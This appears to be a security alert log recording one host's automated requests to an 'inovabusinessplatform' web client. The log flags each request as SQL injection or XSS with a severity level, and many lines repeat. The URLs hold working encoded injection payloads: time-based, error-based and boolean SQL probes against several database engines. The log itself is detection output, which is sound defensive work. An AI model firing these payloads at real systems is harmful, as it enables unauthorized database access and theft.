XSS_INJECTION->LOW | 2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27ITTbgM%3C%27%22%3EoMnMZv
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27osNI%27%3D%27osNI
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20SHIB
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%202589%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282589%3D2589%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20CONCAT%280x7178787171%2C%28SELECT%20%28ELT%282738%3D2738%2C1%29%29%29%2C0x716b6a6b71%29%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286700%3D6700%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286322%3D6322%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%20%28SELECT%204238%20FROM%20%28SELECT%28SLEEP%285%29%29%29JrJg%29%20AND%20%281879%3D1879
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%20%28SELECT%204238%20FROM%20%28SELECT%28SLEEP%285%29%29%29JrJg%29%20AND%20%28%27ssOx%27%3D%27ssOx
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%20%28SELECT%204238%20FROM%20%28SELECT%28SLEEP%285%29%29%29JrJg%29%20AND%20%27cyjg%27%3D%27cyjg
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20AND%20%288358%3D8358
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27SjpN%27%3D%27SjpN
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Pbqm%27%3D%27Pbqm
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20nBOQ
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%281706%3D1706
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27IXEl%27%3D%27IXEl
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27mjgH%27%3D%27mjgH
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20AND%20%287777%3D7777
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20AND%20%28%27oGAM%27%3D%27oGAM
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20AND%20%27QGKo%27%3D%27QGKo
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%204696%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%2874%29%7C%7CCHR%2875%29%7C%7CCHR%2899%29%2C5%29%20XJAe
XSS_INJECTION->LOW | 2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27ITTbgM%3C%27%22%3EoMnMZv
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%207101%3D9190%20AND%20%285231%3D5231
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:22 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%207143%3D7143%20AND%20%282335%3D2335
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%204849%3D2052
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%207143%3D7143
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%205901%3D5424%20AND%20%28%27FOtm%27%3D%27FOtm
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%207143%3D7143%20AND%20%28%27bezG%27%3D%27bezG
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%204676%3D8629%20AND%20%27aolz%27%3D%27aolz
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%207143%3D7143%20AND%20%27ExZz%27%3D%27ExZz
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%203246%3D1698%20iiAT
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%207143%3D7143%20UFue
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20%28CASE%20WHEN%20%286537%3D6311%29%20THEN%20%27%27%20ELSE%20%28SELECT%206311%20UNION%20SELECT%201316%29%20END%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20%28CASE%20WHEN%20%285122%3D5122%29%20THEN%20%27%27%20ELSE%20%28SELECT%202512%20UNION%20SELECT%208604%29%20END%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%288501%3D8501
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27uqNE%27%3D%27uqNE
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27RkQR%27%3D%27RkQR
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%20%28SELECT%202389%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282389%3D2389%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20vwmi
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%284404%3D4404
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27DAry%27%3D%27DAry
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27uLop%27%3D%27uLop
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208838%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288838%3D8838%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20zfzG
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%284431%3D4431
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%28%27AepW%27%3D%27AepW
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%27wuFA%27%3D%27wuFA
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%202590%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282590%3D2590%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20wiSX
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%289064%3D9064
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27oBzd%27%3D%27oBzd
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27osNI%27%3D%27osNI
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%208580%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288580%3D8580%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20SHIB
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%202589%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178787171%2C%28SELECT%20%28ELT%282589%3D2589%2C1%29%29%29%2C0x716b6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20CONCAT%280x7178787171%2C%28SELECT%20%28ELT%282738%3D2738%2C1%29%29%29%2C0x716b6a6b71%29%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286700%3D6700%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29
SQL INJECTIONS->HIGH | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286322%3D6322%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%20%28SELECT%204238%20FROM%20%28SELECT%28SLEEP%285%29%29%29JrJg%29%20AND%20%281879%3D1879
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%20%28SELECT%204238%20FROM%20%28SELECT%28SLEEP%285%29%29%29JrJg%29%20AND%20%28%27ssOx%27%3D%27ssOx
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%20%28SELECT%204238%20FROM%20%28SELECT%28SLEEP%285%29%29%29JrJg%29%20AND%20%27cyjg%27%3D%27cyjg
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%29%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20AND%20%288358%3D8358
SQL INJECTIONS->LOW | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:23 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%29%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27SjpN%27%3D%27SjpN
SQL INJECTIONS->MEDIUM | DATE->2019-08-27 09:52:24 | HOST->172.22.0.3 | REQUEST->GET | URL->/inovabusinessplatform/webclient/%27%20AND%209531%3D%28SELECT%209531%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Pbqm%27%3D%27Pbqm
